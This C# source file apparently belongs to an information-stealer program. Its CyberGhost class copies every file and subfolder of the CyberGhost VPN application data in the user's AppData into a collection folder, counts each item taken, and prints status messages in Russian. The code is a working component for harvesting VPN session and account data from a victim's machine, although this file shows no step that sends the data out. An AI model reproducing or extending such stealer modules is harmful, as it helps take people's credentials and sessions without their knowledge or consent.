using System;
using System.IO;

namespace SHARP
{
    internal class CyberGhost
    {
      public static void SaveFileSession(string head)
      {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\CyberGhost";
        string str1 = head + "\\VPN\\CyberGhost";
        if (!Directory.Exists(path))
        {
          Console.WriteLine("Исходная директория не существует.");
        }
        else
        {
          if (!Directory.Exists(str1))
            Directory.CreateDirectory(str1);
          foreach (string file in Directory.GetFiles(path))
          {
            string fileName = Path.GetFileName(file);
            File.Copy(file, Path.Combine(str1, fileName), true);
            Console.WriteLine($"Файл {fileName} скопирован успешно.");
            ++Counting.cgv;
          }
          foreach (string directory in Directory.GetDirectories(path))
          {
            string fileName = Path.GetFileName(directory);
            string str2 = Path.Combine(str1, fileName);
            Directory.CreateDirectory(str2);
            Filemanager.CopyDirectory(directory, str2);
            ++Counting.cgv;
          }
        }
      }
    }
}
